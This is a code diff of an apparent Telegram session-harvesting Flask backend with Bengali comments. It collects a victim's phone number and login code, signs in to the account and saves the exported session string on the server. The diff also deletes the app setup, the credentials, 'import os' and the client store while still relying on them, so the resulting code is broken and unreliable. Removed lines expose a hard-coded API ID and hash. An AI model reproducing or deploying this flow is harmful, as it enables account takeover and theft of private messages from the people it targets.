@@ -1,33 +1,11 @@
-import os
+import asyncio
 from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
 from pyrogram import Client
-from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneNumberInvalid
+from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid
 
-app = Flask(__name__)
-CORS(app)
+# ... (বাকি কনফিগারেশন একই থাকবে)
 
-API_ID = 33511945
-API_HASH = "d044392a17690c14ee5b4a23651a0700"
-
-# অস্থায়ী মেমোরিতে ক্লায়েন্ট ও ফোন হ্যাশ স্টোর করার জন্য ডিকশনারি
-temp_clients = {}
-
-@app.route('/', methods=['GET'])
-def home():
-    try:
-        return send_file('index.html')
-    except Exception:
-        return "index.html not found", 404
-
-@app.route('/verify', methods=['GET'])
-def verify_page():
-    try:
-        return send_file('verify.html')
-    except Exception:
-        return "verify.html not found", 404
-
-# ধাপ ১: ফোন নম্বর রিসিভ করে টেলিগ্রাম থেকে ওটিপি কোড পাঠানো
 @app.route('/send-code', methods=['POST'])
 def send_code():
     data = request.json
@@ -37,16 +15,23 @@ def send_code():
         return jsonify({"status": "error", "message": "Phone number is required"}), 400
 
     try:
-        # ইউনিক সেশন নেম বা আইডি তৈরি
         session_name = f"session_{phone.replace('+', '')}"
         client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
         
-        client.connect()
-        sent_code = client.send_code(phone)
+        # থ্রেডের জন্য নতুন ইভেন্ট লুপ তৈরি করে রান করা
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
         
-        # ক্লায়েন্ট এবং ফোন কোড হাশ সেভ করে রাখা
+        async def main():
+            await client.connect()
+            sent_code = await client.send_code(phone)
+            return sent_code
+
+        sent_code = loop.run_until_complete(main())
+        
         temp_clients[phone] = {
             "client": client,
+            "loop": loop,
             "phone_code_hash": sent_code.phone_code_hash
         }
         
@@ -54,7 +39,7 @@ def send_code():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 400
 
-# ধাপ ২: ওটিপি কোড ভেরিফাই করে .session ফাইল জেনারেট করা
+
 @app.route('/verify-code', methods=['POST'])
 def verify_code():
     data = request.json
@@ -69,21 +54,22 @@ def verify_code():
 
     user_data = temp_clients[phone]
     client = user_data["client"]
+    loop = user_data["loop"]
     phone_code_hash = user_data["phone_code_hash"]
 
     try:
-        # টেলিগ্রামে সাইন ইন করা
-        client.sign_in(phone, phone_code_hash, code)
-        
-        # সফল হলে সেশন স্ট্রিং বা ফাইল সেভ করা (সার্ভারে ফাইলে সেভ হবে)
-        session_string = client.export_session_string()
-        session_filename = f"sessions/{phone.replace('+', '')}.session"
-        
-        os.makedirs("sessions", exist_ok=True)
-        with open(session_filename, "w") as f:
-            f.write(session_string)
+        async def verify_main():
+            await client.sign_in(phone, phone_code_hash, code)
+            session_string = await client.export_session_string()
             
-        client.disconnect()
+            os.makedirs("sessions", exist_ok=True)
+            session_filename = f"sessions/{phone.replace('+', '')}.session"
+            with open(session_filename, "w") as f:
+                f.write(session_string)
+                
+            await client.disconnect()
+
+        loop.run_until_complete(verify_main())
         del temp_clients[phone]
         
         return jsonify({"status": "success", "message": "Session generated successfully!"})
@@ -91,10 +77,6 @@ def verify_code():
     except PhoneCodeInvalid:
         return jsonify({"status": "error", "message": "Invalid OTP code!"}), 400
     except SessionPasswordNeeded:
-        return jsonify({"status": "success", "message": "2FA Password required (Account is secure)"})
+        return jsonify({"status": "success", "message": "2FA Password required"})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 400
-
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
